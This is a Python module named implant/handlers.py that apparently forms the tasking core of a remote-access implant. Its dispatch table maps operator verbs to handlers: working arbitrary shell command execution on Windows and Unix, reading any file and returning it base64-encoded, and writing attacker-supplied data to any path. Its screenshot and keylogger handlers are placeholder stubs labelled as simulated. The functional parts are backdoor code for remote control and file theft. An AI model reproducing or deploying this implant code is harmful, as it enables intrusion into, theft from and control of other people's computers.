# implant/handlers.py

import base64
import logging
import platform
import subprocess

log = logging.getLogger("implant.handlers")


async def dispatch(verb: str, args: str) -> tuple[bool, str]:
    handler = _HANDLERS.get(verb)
    if handler is None:
        log.warning("Unknown verb: %s", verb)
        return False, f"unknown verb: {verb}"
    try:
        return await handler(args)
    except Exception as exc:
        log.exception("Handler %s raised", verb)
        return False, str(exc)


# ── Handlers ──────────────────────────────────────────────────────────────────

async def handle_cmd(args: str) -> tuple[bool, str]:
    if not args.strip():
        return False, "no command provided"
    log.info("cmd exec: %s", args)
    is_windows = platform.system() == "Windows"
    shell_args = ["cmd.exe", "/c", args] if is_windows else ["sh", "-c", args]
    try:
        result = subprocess.run(shell_args, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
        return True, output.strip() or "(no output)"
    except subprocess.TimeoutExpired:
        return False, "command timed out"


async def handle_shell(args: str) -> tuple[bool, str]:
    # Stateless — same as cmd for now
    return await handle_cmd(args)


async def handle_screenshot(args: str) -> tuple[bool, str]:
    log.info("screenshot requested")
    # 1x1 transparent PNG — swap in pyautogui.screenshot() for real captures
    FAKE_PNG = (
        b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01"
        b"\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89"
        b"\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01"
        b"\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82"
    )
    return True, base64.b64encode(FAKE_PNG).decode()


async def handle_keylog_start(args: str) -> tuple[bool, str]:
    log.info("keylogger started (simulated)")
    return True, ""


async def handle_keylog_stop(args: str) -> tuple[bool, str]:
    log.info("keylogger stopped (simulated)")
    return True, ""


async def handle_download(args: str) -> tuple[bool, str]:
    path = args.strip()
    log.info("download: %s", path)
    try:
        with open(path, "rb") as f:
            return True, base64.b64encode(f.read()).decode()
    except FileNotFoundError:
        fake = f"[simulated content of {path}]".encode()
        return True, base64.b64encode(fake).decode()
    except PermissionError:
        return False, f"permission denied: {path}"


async def handle_upload(args: str) -> tuple[bool, str]:
    # args: "<path> <base64data>"
    parts = args.split(" ", 1)
    if len(parts) != 2:
        return False, "expected: <path> <base64data>"
    path, b64 = parts
    log.info("upload: %s", path)
    try:
        data = base64.b64decode(b64)
        with open(path, "wb") as f:
            f.write(data)
        return True, f"wrote {len(data)} bytes to {path}"
    except Exception as exc:
        return False, str(exc)


# ── Dispatch table ────────────────────────────────────────────────────────────

_HANDLERS = {
    "cmd":          handle_cmd,
    "shell":        handle_shell,
    "screenshot":   handle_screenshot,
    "keylog_start": handle_keylog_start,
    "keylog_stop":  handle_keylog_stop,
    "download":     handle_download,
    "upload":       handle_upload,
}